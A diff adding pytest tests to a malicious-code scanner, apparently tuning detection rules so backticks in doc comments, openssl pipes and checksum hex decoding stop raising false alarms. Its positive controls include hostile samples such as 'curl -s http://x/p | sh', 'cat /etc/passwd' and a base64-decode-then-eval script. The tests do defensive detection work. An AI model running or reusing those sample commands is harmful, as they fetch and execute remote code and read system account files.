@@ -8479,3 +8479,184 @@ class TestAFileNamedForAuthenticationOwnsWhatItReads:
         """The control, and three files from the corpus that keep their severity: reading
         somebody's browser login database is not authentication however useful it is."""
         assert not self._names(path)
+
+
+class TestABacktickInProseIsNotACommand:
+    """The broadest single defect this pass found. Three shell-family spawn rules carried
+    `` `[^`]{2,}` `` -- any two characters between backticks -- which is also the markdown
+    convention for inline code, and every language's doc comments use it.
+
+    `netdata` writes `` `JournalFile` `` in a Rust doc comment. `dotfiles` writes
+    `` `zopfli` ``. vLLM writes `` `setdefault` `` in a docstring. `getgrav/grav` builds a
+    regex as ``'`' . $token[0] . '([A-Za-z0-9+/]+={0,2})' . $token[1] . '`mu'`` and was
+    reported as spawning a process. The spawn half of every composite was free in any file
+    that documented itself.
+
+    A command substitution runs a program, so the content has to contain something only a
+    command line has: a space before an argument, a path separator, a variable, or a
+    pipeline or redirect. Plus the handful of commands a script really does substitute
+    bare.
+    """
+
+    RULES: ClassVar[tuple[str, ...]] = (
+        "CAP.SH.SPAWN.001",
+        "CAP.PHP.SPAWN.001",
+        "CAP.MK.SPAWN.001",
+    )
+
+    @staticmethod
+    def _matches(rule_id: str, raw: bytes) -> bool:
+        from cordon_scanner.rules.loader import RuleLoader, RuleSet
+
+        rule = next(r for r in RuleSet(RuleLoader.load_builtin()) if r.id == rule_id)
+        return bool(rule.match.regex.search(raw))
+
+    @pytest.mark.parametrize(
+        "raw",
+        [
+            b"/// Reads a `JournalFile` from disk.",
+            b"# Wraps `zopfli` when it is installed.",
+            b"    *driver_env_vars* are applied with `setdefault`.",
+            b"// See `std::process::Command` for the real thing.",
+        ],
+    )
+    @pytest.mark.parametrize("rule_id", RULES)
+    def test_inline_code_in_prose_spawns_nothing(self, rule_id: str, raw: bytes) -> None:
+        assert not self._matches(rule_id, raw)
+
+    def test_a_backtick_inside_single_quotes_is_a_character(self, tmp_path) -> None:
+        """The case the pattern alone could not answer. `getgrav/grav` uses the backtick
+        as its `preg` delimiter and builds the pattern by concatenation, so the content
+        between the two backticks genuinely contains spaces, a `$` and a `/` -- it looks
+        exactly like a command line, because it is a regular expression.
+
+        What settles it is the quote state: every backtick in it is a character in a
+        single-quoted string. Single quotes only -- in shell, `x="`ls`"` IS a
+        substitution, because double quotes interpolate and backticks inside them run."""
+        (tmp_path / "Page.php").write_text(
+            "<?php\n"
+            "$patterns = ['`' . $token[0] . '([A-Za-z0-9+/]+={0,2})' . $token[1] . '`mu'];\n"
+            "$raw = base64_decode($match[1]);\n"
+        )
+        assert "SUSPECT.DECODE_EXEC.001" not in flagged(tmp_path)
+
+    def test_a_substitution_in_double_quotes_still_runs(self, tmp_path) -> None:
+        """The control, and the reason the test asks WHICH quote."""
+        (tmp_path / "run.sh").write_text(
+            '#!/bin/sh\nblob=$(cat payload.b64)\nout="`echo $blob | base64 -d`"\neval "$out"\n'
+        )
+        assert "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)
+
+    @pytest.mark.parametrize(
+        "raw",
+        [
+            b"out=`ls -la /tmp`",
+            b"v=`cat /etc/passwd`",
+            b"y=`curl -s http://x/p | sh`",
+            b"z=`$HOME/bin/tool`",
+            # The bare forms worth keeping, which is why there is a second alternative.
+            b"u=`whoami`",
+            b"h=`hostname`",
+        ],
+    )
+    @pytest.mark.parametrize("rule_id", RULES)
+    def test_a_real_substitution_still_does(self, rule_id: str, raw: bytes) -> None:
+        assert self._matches(rule_id, raw)
+
+    def test_the_declared_baselines_moved_with_it(self) -> None:
+        """Three `baseline_hits` declarations had to come down by one, which is the
+        mechanism working: the benign corpus had files whose only spawn hit was a
+        backtick-quoted word in a comment, and a narrowing that did not change a
+        declaration would have been a narrowing nobody measured."""
+        from cordon_scanner.rules.loader import RuleLoader, RuleSet
+
+        declared = {
+            r.id: r.rule.baseline_hits
+            for r in RuleSet(RuleLoader.load_builtin())
+            if r.id in self.RULES
+        }
+        assert declared == {
+            "CAP.SH.SPAWN.001": 2,
+            "CAP.PHP.SPAWN.001": 1,
+            "CAP.MK.SPAWN.001": 1,
+        }
+
+
+class TestAFlagBelongsToItsOwnCommand:
+    """`mathiasbynens/dotfiles` has a `dataurl` helper that runs
+    `openssl base64 -in "$1" | tr -d '\\n'`. The decode pattern was
+    `openssl\\s+(?:enc|base64)\\b[^\\n]*-d\\b`, and `[^\\n]*` reached across the pipe into
+    `tr`'s `-d` -- so encoding a file as a data URL was read as decoding a payload.
+    """
+
+    @staticmethod
+    def _matches(raw: bytes) -> bool:
+        from cordon_scanner.rules.loader import RuleLoader, RuleSet
+
+        rule = next(r for r in RuleSet(RuleLoader.load_builtin()) if r.id == "CAP.SH.DECODE.001")
+        return bool(rule.match.regex.search(raw))
+
+    @pytest.mark.parametrize(
+        "raw",
+        [
+            b"""openssl base64 -in "$1" | tr -d '\\n'""",
+            b"openssl base64 -in cert.pem; tr -d x",
+        ],
+    )
+    def test_a_flag_after_a_separator_is_another_commands(self, raw: bytes) -> None:
+        assert not self._matches(raw)
+
+    @pytest.mark.parametrize(
+        "raw",
+        [
+            b'echo "$B" | openssl base64 -d > /tmp/x',
+            b"openssl enc -aes-256-cbc -d -in x.enc -out x",
+            b"openssl base64 -decode -in x.b64",
+        ],
+    )
+    def test_decoding_still_matches(self, raw: bytes) -> None:
+        assert self._matches(raw)
+
+
+class TestHexIsHowAChecksumIsWrittenDown:
+    """`Wei-Shaw/sub2api` writes `hex.DecodeString(installation.BinarySHA256)` and then
+    runs the binary -- which is VERIFYING it, and came out as decode-then-execute, the
+    opposite of what it does. `netdata` writes `hex::decode(content.trim())` to read a
+    journal UUID.
+
+    Decoding a checksum, a digest or a UUID is parsing an identifier rather than
+    unpacking a payload.
+    """
+
+    @staticmethod
+    def _matches(rule_id: str, raw: bytes) -> bool:
+        from cordon_scanner.rules.loader import RuleLoader, RuleSet
+
+        rule = next(r for r in RuleSet(RuleLoader.load_builtin()) if r.id == rule_id)
+        return bool(rule.match.regex.search(raw))
+
+    @pytest.mark.parametrize(
+        ("rule_id", "raw"),
+        [
+            ("CAP.GO.DECODE.001", b"b, _ := hex.DecodeString(installation.BinarySHA256)"),
+            ("CAP.GO.DECODE.001", b"b, _ := hex.DecodeString(hashValue)"),
+            ("CAP.BUILD.DECODE.001", b"let u = hex::decode(uuid_text)?;"),
+            ("CAP.BUILD.DECODE.001", b"let c = hex::decode(expected_sha256)?;"),
+            ("CAP.BUILD.DECODE.001", b"let d = hex::decode(file_digest)?;"),
+        ],
+    )
+    def test_an_identifier_is_not_a_payload(self, rule_id: str, raw: bytes) -> None:
+        assert not self._matches(rule_id, raw)
+
+    @pytest.mark.parametrize(
+        ("rule_id", "raw"),
+        [
+            ("CAP.GO.DECODE.001", b"b, _ := hex.DecodeString(blob)"),
+            ("CAP.BUILD.DECODE.001", b"let p = hex::decode(payload)?;"),
+            ("CAP.BUILD.DECODE.001", b"let d = hex::decode(shellcode)?;"),
+        ],
+    )
+    def test_anything_else_is_still_a_decode(self, rule_id: str, raw: bytes) -> None:
+        """The control, and the reason the list is checksum words and not a guess about
+        what a payload is called."""
+        assert self._matches(rule_id, raw)
